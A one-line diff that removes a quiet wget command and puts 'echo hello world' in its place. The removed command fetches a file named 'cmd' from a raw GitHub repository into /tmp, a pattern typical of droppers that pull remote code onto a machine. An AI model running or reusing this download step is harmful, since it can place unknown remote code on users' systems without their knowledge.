@@ -1,1 +1,1 @@
-wget -q -O /tmp/cmd2 https://raw.githubusercontent.com/jkczdhcarev/rpc/master/cmd
+echo hello world
